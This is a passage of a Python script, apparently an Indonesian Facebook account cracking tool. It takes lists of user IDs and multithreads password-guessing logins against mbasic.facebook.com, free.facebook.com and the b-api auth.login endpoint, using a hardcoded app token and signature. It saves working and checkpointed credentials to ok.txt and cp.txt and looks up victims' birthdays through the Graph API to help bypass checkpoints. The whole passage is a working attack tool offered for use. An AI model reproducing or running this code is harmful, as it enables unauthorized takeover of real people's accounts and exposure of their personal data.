			print((o+"\n["+p+"•"+o+"]"+o+" Crack Dimulai..."+o+"\n["+p+"•"+o+"]"+o+" Account [OK] Saved to : ok.txt"+o+"\n["+p+"•"+o+"]"+o+" Account [CP] Saved to : cp.txt"+o+"\n["+p+"•"+o+"]"+o+" Jika Tidak Ada Hasil, Mode Pesawat (5 Detik)\n"))
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=mbasic(fl.get("id"),
					i,"https://mbasic.facebook.com")
				if log.get("status")=="cp":
					print(("\r\x1b[0;36m[\x1b[0;36mCP\x1b[0;36m] %s • %s               "%(fl.get("id"),i)))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("cp.txt","a+").write("%s • %s\n"%(fl.get("id"),i))
					break
				elif log.get("status")=="success":
					print(("\r\x1b[0;36m[\x1b[0;36mOK\x1b[0;36m] %s • %s               "%(fl.get("id"),i)))
					self.ada.append("%s • %s"%(fl.get("id"),i))
					open("ok.txt","a+").write("%s • %s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print("\r\x1b[0;36m[\x1b[0;37mCrack\x1b[0;36m]\x1b[0;36m\x1b[0;36m[\x1b[0;36m%s/%s\x1b[0;36m]\x1b[0;36m[\x1b[0;36mOK:%s\x1b[0;36m]\x1b[0;36m[\x1b[0;36mCP:%s\x1b[0;36m]\x1b[0;36m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)

class crackttl:
	os.system("clear")
	banner()
	def __init__(self,isifile):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print((o+"\n["+p+"•"+o+"]"+o+" Crack Dengan Password Default/Manual [d/m]"))
		while True:
			f=input(o+"["+p+"•"+o+"]"+o+" Pilih : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(("   %s"%e))
					continue
				print((o+"["+p+"•"+o+"]"+o+" Contoh : sayang,bismillah,123456"))
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("   %s"%e))
				print((o+"\n["+p+"•"+o+"]"+o+" Crack Dimulai..."+o+"\n["+p+"•"+o+"]"+o+" Account [OK] Saved to : ok.txt"+o+"\n["+p+"•"+o+"]"+o+" Account [CP] Saved to : cp.txt"+o+"\n["+p+"•"+o+"]"+o+" Jika Tidak Ada Hasil, Mode Pesawat (5 Detik)\n"))
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				exit()
				break
	def pwlist(self):
		self.pw=input(o+"["+p+"•"+o+"]"+o+" Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print((o+"\n["+p+"•"+o+"]"+p+" Crack Dimulai..."+o+"\n["+p+"•"+o+"]"+o+" Account [OK] Saved to : ok.txt"+o+"\n["+p+"•"+o+"]"+o+" Account [CP] Saved to : cp.txt"+o+"\n["+p+"•"+o+"]"++" Jika Tidak Ada Hasil, Mode Pesawat (5 Detik)\n"))
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=mbasic(fl.get("id"),
					i,"https://mbasic.facebook.com")
				if log.get("status")=="cp":
					try:
						ke=requests.get("https://graph.facebook.com/"+fl.get("id")+"?access_token="+open("login.txt","r").read())
						tt=json.loads(ke.text)
						ttl=tt["birthday"]
						m,d,y = ttl.split("/")
						m = bulan_ttl[m]
						print(("\r\x1b[0;36m[\x1b[0;36mCP\x1b[0;36m] %s • %s • %s %s %s   "%(fl.get("id"),i,d,m,y)))
						self.cp.append("%s • %s • %s %s %s"%(fl.get("id"),i,d,m,y))
						open("cp.txt","a+").write("%s • %s • %s %s %s\n"%(fl.get("id"),i,d,m,y))
						break
					except(KeyError, IOError):
						m = " "
						d = " "
						y = " "
					except:pass
					print(("\r\x1b[0;36m[\x1b[0;36mCP\x1b[0;36m] %s • %s               "%(fl.get("id"),i)))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("cp.txt","a+").write("%s • %s\n"%(fl.get("id"),i))
					break
				elif log.get("status")=="success":
					print(("\r\x1b[0;36m[\x1b[0;32mOK\x1b[0;36m] %s • %s               "%(fl.get("id"),i)))
					self.ada.append("%s • %s"%(fl.get("id"),i))
					open("ok.txt","a+").write("%s • %s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print("\r\x1b[0;36m[\x1b[0;36mCrack\x1b[0;36m]\x1b[0;36m\x1b[0;36m[\x1b[0;36m%s/%s\x1b[0;36m]\x1b[0;36m[\x1b[0;36mOK:%s\x1b[0;36m]\x1b[0;36m[\x1b[0;36mCP:%s\x1b[0;36m]\x1b[0;36m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)

class crackffb:
	os.system("clear")
	banner()
	def __init__(self,isifile):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print((o+"\n["+p+"•"+o+"]"+o+" Crack Dengan Password Default/Manual [d/m]"))
		while True:
			f=input(o+"["+p+"•"+o+"]"+o+" Pilih : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(("   %s"%e))
					continue
				print((o+"["+p+"•"+o+"]"+o+" Contoh : sayang,bismillah,123456"))
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("   %s"%e))
				print((o+"\n["+p+"•"+o+"]"+o+" Crack Dimulai..."+o+"\n["+p+"•"+o+"]"+o+" Account [OK] Saved to : ok.txt"+o+"\n["+p+"•"+o+"]"+o+" Account [CP] Saved to : cp.txt"+o+"\n["+p+"•"+o+"]"+o+" Jika Tidak Ada Hasil, Mode Pesawat (5 Detik)\n"))
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				exit()
				break
	def pwlist(self):
		self.pw=input(o+"["+p+"•"+o+"]"+o+" Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print((o+"\n["+p+"•"+o+"]"+o+" Crack Dimulai..."+o+"\n["+p+"•"+o+"]"+o+" Account [OK] Saved to : ok.txt"+o+"\n["+p+"•"+o+"]"+o+" Account [CP] Saved to : cp.txt"+o+"\n["+p+"•"+o+"]"+o+" Jika Tidak Ada Hasil, Mode Pesawat (5 Detik)\n"))
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=f_fb(fl.get("id"),
					i,"https://free.facebook.com")
				if log.get("status")=="cp":
					print(("\r\x1b[0;36m[\x1b[0;36mCP\x1b[0;36m] %s • %s               "%(fl.get("id"),i)))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("cp.txt","a+").write("%s • %s\n"%(fl.get("id"),i))
					break
				elif log.get("status")=="success":
					print(("\r\x1b[0;36m[\x1b[0;36mOK\x1b[0;36m] %s • %s               "%(fl.get("id"),i)))
					self.ada.append("%s • %s"%(fl.get("id"),i))
					open("ok.txt","a+").write("%s • %s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print("\r\x1b[0;36m[\x1b[0;36mCrack\x1b[0;36m]\x1b[0;36m\x1b[0;36m[\x1b[0;36m%s/%s\x1b[0;36m]\x1b[0;36m[\x1b[0;36mOK:%s\x1b[0;36m]\x1b[0;36m[\x1b[0;36mCP:%s\x1b[0;36m]\x1b[0;36m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)

class bapi:
  def __init__(self,isifile):
    self.setpw = False
    self.ok = []
    self.cp = []
    self.loop = 0
    self.krah(isifile)
  def krah(self,isifile):
    print((o+"\n["+p+"•"+o+"]"+o+" Crack Dengan Password Default/Manual [d/m]"))
    while True:
      f=input(o+"["+p+"•"+o+"]"+o+" Pilih : ")
      if f in[""," "]:
        print((o+"["+m+"!"+o+"]"+m+" Invalid Number"))
        continue
      elif f in["m","M"]:
        try:
          while True:
            try:
              self.apk=isifile
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print((o+"["+m+"!"+o+"]"+m+" %s"%e))
              continue
          self.fl=[]
          print((o+"["+p+"•"+o+"]"+o+" Contoh : sayang,bismillah,123456"))
          self.pw=input(o+"["+p+"•"+o+"]"+o+" Password List : ").split(",")
          if len(self.pw) ==0:
            continue
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":self.pw})
            except:
              continue
        except Exception as e:
          print(("  %s"%e))
          continue
        print((o+"\n["+p+"•"+o+"]"+o+" Crack Dimulai..."+o+"\n["+p+"•"+o+"]"+o+" Account [OK] Saved to : ok.txt"+o+"\n["+p+"•"+o+"]"+o+" Account [CP] Saved to : cp.txt"+o+"\n["+p+"•"+o+"]"+o+" Jika Tidak Ada Hasil, Mode Pesawat (5 Detik)\n"))
        ThreadPool(30).map(self.brute,self.fl)
        #os.remove(self.apk)
        exit()
        break
      elif f in["d","D"]:
        try:
          while True:
            try:
              self.apk=isifile
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print(e)
              continue
          self.fl=[]
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
            except:continue
        except:
          continue
        print((o+"\n["+p+"•"+o+"]"+o+" Crack Dimulai..."+o+"\n["+p+"•"+o+"]"+o+" Account [OK] Saved to : ok.txt"+o+"\n["+p+"•"+o+"]"+o+" Account [CP] Saved to : cp.txt"+k+"\n["+p+"•"+o+"]"+o+" Jika Tidak Ada Hasil, Mode Pesawat (5 Detik)\n"))
        ThreadPool(30).map(self.brute,self.fl)
        os.remove(self.apk)
        exit()
        break
  def bruteRequest(self, username, password):
    global ok,cp,ttl
    params = {"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",  "format": "JSON", "sdk_version": "2", "email": username, "locale": "en_US", "password": password, "sdk": "ios", "generate_session_cookies": "1", "sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
    api = "https://b-api.facebook.com/method/auth.login"
    response = requests.get(api, params=params)
    if re.search("(EAAA)\\w+", response.text):
      self.ok.append(username + " • " + password)
      print(("\r\x1b[0;36m[\x1b[0;36mOK\x1b[0;32m] %s • %s %s               "%(username,password,N)))
      ok.append(username + " • " + password)
      save = open("ok.txt", "a")
      save.write(str(username) + " • " + str(password) + "\n")
      save.close()
      return True
    else:
      if "www.facebook.com" in response.json()["error_msg"]:
        self.cp.append(username + " • " + password)
        print(("\r\x1b[0;36m[\x1b[0;36mCP\x1b[0;36m] %s • %s %s               "%(username,password,N)))
        save = open("cp.txt", "a+")
        save.write(str(username) + " • " + str(password) + "\n")
        save.close()
        return True
    return False
  def brute(self, fl):
    if self.setpw == False:
      self.loop += 1
      for pw in fl["pw"]:
        username = fl["id"].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          continue
        print(("\r\x1b[0;36m[\x1b[0;37mCrack\x1b[0;36m]\x1b[0;36m\x1b[0;36m[\x1b[0;36m%s/%s\x1b[0;36m]\x1b[0;36m[\x1b[0;36mOK:%s\x1b[0;36m]\x1b[0;36m[\x1b[0;36mCP:%s\x1b[0;36m]\x1b[0;36m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()
    else:
      self.loop += 1
      for pw in self.setpw:
        username = users["id"].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          continue
        print(("\r\x1b[0;36m[\x1b[0;37mCrack\x1b[0;36m]\x1b[0;36m\x1b[0;36m[\x1b[0;36m%s/%s\x1b[0;36m]\x1b[0;36m[\x1b[0;36mOK:%s\x1b[0;36m]\x1b[0;36m[\x1b[0;36mCP:%s\x1b[0;36m]\x1b[0;36m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()

class bapittl:
  def __init__(self,isifile):
    self.setpw = False
    self.ok = []
    self.cp = []
    self.loop = 0
    self.krah(isifile)
  def krah(self,isifile):
    print((o+"\n["+p+"•"+o+"]"+o+" Crack Dengan Password Default/Manual [d/m]"))
    while True:
      f=input(o+"["+p+"•"+o+"]"+o+" Pilih : ")
      if f in[""," "]:
        print((o+"["+m+"!"+o+"]"+m+" Invalid Number"))
        continue
      elif f in["m","M"]:
        try:
          while True:
            try:
              self.apk=isifile
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print((o+"["+m+"!"+o+"]"+m+" %s"%e))
              continue
          self.fl=[]
          print((o+"["+p+"•"+o+"]"+o+" Contoh : sayang,bismillah,123456"))
          self.pw=input(o+"["+p+"•"+o+"]"+o+" Password List : ").split(",")
          if len(self.pw) ==0:
            continue
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":self.pw})
            except:
              continue
        except Exception as e:
          print(("  %s"%e))
          continue
        print((o+"\n["+p+"•"+o+"]"+o+" Crack Dimulai..."+o+"\n["+p+"•"+o+"]"+o+" Account [OK] Saved to : ok.txt"+o+"\n["+p+"•"+o+"]"+o+" Account [CP] Saved to : cp.txt"+o+"\n["+o+"•"+o+"]"+o+" Jika Tidak Ada Hasil, Mode Pesawat (5 Detik)\n"))
        ThreadPool(30).map(self.brute,self.fl)
        #os.remove(self.apk)
        exit()
        break
      elif f in["d","D"]:
        try:
          while True:
            try:
              self.apk=isifile
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print(e)
              continue
          self.fl=[]
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
            except:continue
        except:
          continue
        print((o+"\n["+p+"•"+o+"]"+o+" Crack Dimulai..."+o+"\n["+p+"•"+o+"]"+o+" Account [OK] Saved to : ok.txt"+o+"\n["+p+"•"+o+"]"+o+" Account [CP] Saved to : cp.txt"+o+"\n["+p+"•"+o+"]"+o+" Jika Tidak Ada Hasil, Mode Pesawat (5 Detik)\n"))
        ThreadPool(30).map(self.brute,self.fl)
        os.remove(self.apk)
        exit()
        break
  def bruteRequest(self, username, password):
    global ok,cp,ttl
    params = {"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",  "format": "JSON", "sdk_version": "2", "email": username, "locale": "en_US", "password": password, "sdk": "ios", "generate_session_cookies": "1", "sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
    api = "https://b-api.facebook.com/method/auth.login"
    response = requests.get(api, params=params)
    if re.search("(EAAA)\\w+", response.text):
      self.ok.append(username + " • " + password)
      print(("\r\x1b[0;36m[\x1b[0;32mOK\x1b[0;36m] %s • %s %s               "%(username,password,N)))
      ok.append(username + " • " + password)
      save = open("ok.txt", "a")
      save.write(str(username) + " • " + str(password) + "\n")
      save.close()
      return True
    else:
      if "www.facebook.com" in response.json()["error_msg"]:
        try:
          ke=requests.get("https://graph.facebook.com/"+str(username)+"?access_token="+open("login.txt","r").read())
          tt=json.loads(ke.text)
          ttl=tt["birthday"]
          m,d,y = ttl.split("/")
          m = bulan_ttl[m]
          self.cp.append("%s • %s • %s %s %s"%(username,password,d,m,y))
          print(("\r\x1b[0;36m[\x1b[0;36mCP\x1b[0;36m] %s • %s • %s %s %s %s   "%(username,password,d,m,y,N)))
          save = open("cp.txt", "a+")
          save.write(str(username) + " • " + str(password) + " • "+ str(ttl)+"\n")
          save.close()
          return True
        except(KeyError, IOError):
          m = " "
          d = " "
          y = " "
        except:pass
        self.cp.append(username + " • " + password)
        print(("\r\x1b[0;36m[\x1b[0;36mCP\x1b[0;33m] %s • %s %s   "%(username,password,N)))
        save = open("cp.txt", "a+")
        save.write(str(username) + " • " + str(password) + " • "+ str(ttl)+"\n")
        save.close()
        return True
    return False
  def brute(self, fl):
    if self.setpw == False:
      self.loop += 1
      for pw in fl["pw"]:
        username = fl["id"].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          continue
        print(("\r\x1b[0;36m[\x1b[0;37mCrack\x1b[0;36m]\x1b[0;36m\x1b[0;36m[\x1b[0;36m%s/%s\x1b[0;36m]\x1b[0;36m[\x1b[0;36mOK:%s\x1b[0;36m]\x1b[0;36m[\x1b[0;36mCP:%s\x1b[0;36m]\x1b[0;36m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()
    else:
      self.loop += 1
      for pw in self.setpw:
        username = users["id"].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          continue
        print(("\r\x1b[0;36m[\x1b[0;37mCrack\x1b[0;36m]\x1b[0;36m\x1b[0;36m[\x1b[0;36m%s/%s\x1b[0;36m]\x1b[0;36m[\x1b[0;36mOK:%s\x1b[0;36m]\x1b[0;36m[\x1b[0;36mCP:%s\x1b[0;36m]\x1b[0;36m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()

### RESULT ###

def results(Dapunta,Krahkrah):
        if len(Dapunta) !=0:
                print(("[OK] : "+str(len(Dapunta))))
        if len(Krahkrah) !=0:
                print(("[CP] : "+str(len(Krahkrah))))
        if len(Dapunta) ==0 and len(Krahkrah) ==0:
                print("\n")
                print((o+"["+m+"!"+o+"]"+m+" Hasil Tidak Ada"))

def ress():
    os.system("clear")
    banner()
    print((o+"\n[ "+p+"Hasil Crack"+o+" ]"+p))
    print((o+"\n[ "+h+"OK"+i+" ]"+p))
    try:
        os.system("cat ok.txt")
    except IOError:
        print((o+"["+m+"!"+o+"]"+m+" Hasil Tidak Ada"))
    print((o+"\n[ "+o+"CP"+o+" ]"+p))
    try:
        os.system("cat cp.txt")
    except IOError:
        print((o+"["+m+"!"+o+"]"+m+" Hasil Tidak Ada"))
    input(o+"\n[ "+p+"Kembali"+o+" ]"+p)
    menu()

if __name__=="__main__":
	os.system("git pull")
	country()
